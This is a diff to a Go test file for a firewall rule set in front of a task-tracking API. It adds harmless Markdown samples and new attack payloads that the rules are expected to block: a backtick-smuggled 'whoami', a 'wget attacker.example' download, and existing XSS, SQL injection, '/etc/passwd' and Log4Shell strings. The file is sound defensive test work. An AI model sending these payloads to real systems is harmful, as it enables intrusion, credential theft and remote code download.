@@ -71,6 +71,8 @@ var tdTitles = []string{"Eat potato’s", "Call the plumber about the sink", "Re
 // lists, links, emphasis and code, and plain sentences.
 var tdProse = []string{
 	"- \"Are you still watching\" prompt\n- \"Watch together\" feature\n- Metadata retrieval for music (lyrics too) and films",
+	"```\ndnf install bc gcc clang cmake gnuplot lvm2 ffmpeg\n```",
+	"Use `dnf install ffmpeg` first",
 	"It went swell",
 	"I want to eat extra potato’s",
 	"- [ ] milk\n- [x] eggs\n- [ ] bread (the seeded one)\n\nSee [the list](https://example.com/lists/groceries) for the rest.",
@@ -693,7 +695,8 @@ type tdAttack struct {
 // rule, a push address or a passkey's answer, in a password sent where no
 // password goes, and in the session cookie. Text, which the set reads as
 // paranoia 1 does, keeps what CRS alone refuses there but a command run
-// under another, which plain sentences spell.
+// under another or after a backtick, which plain sentences and Markdown
+// code spell.
 func TestTheTendrilsSetKeepsTheAttacks(t *testing.T) {
 	t.Parallel()
 	g := td{vw{rand.New(rand.NewPCG(7, 22))}}
@@ -710,6 +713,8 @@ func TestTheTendrilsSetKeepsTheAttacks(t *testing.T) {
 		{1, tdBody("POST", api+"/tasks", map[string]any{"id": task, "space_id": space, "title": "<script>alert(document.cookie)</script>"})},
 		{1, tdBody("POST", api+"/tasks", map[string]any{"id": task, "space_id": space, "title": "x' UNION SELECT password FROM users--"})},
 		{1, tdBody("POST", api+"/tasks", map[string]any{"id": task, "space_id": space, "title": "x", "notes": "Lost the keys; cat /etc/passwd"})},
+		{1, tdBody("POST", api+"/tasks", map[string]any{"id": task, "space_id": space, "title": "x", "notes": "Lost the a`whoami`b keys"})},
+		{1, tdBody("POST", api+"/tasks", map[string]any{"id": task, "space_id": space, "title": "x", "notes": "x && wget attacker.example/x -O /tmp/x"})},
 		{1, tdBody("POST", api+"/journal/notes", map[string]any{"id": g.id(), "date": g.day(), "body": "${jndi:ldap://attacker.example/a}"})},
 		{1, tdBody("POST", api+"/tasks/"+task+"/checkins", map[string]any{"id": g.id(), "value": 1, "note": "1' OR '1'='1' --"})},
 		{1, tdBody("POST", api+"/tasks/"+task+"/comments", map[string]any{"body": `"><svg onload=alert(1)>`})},
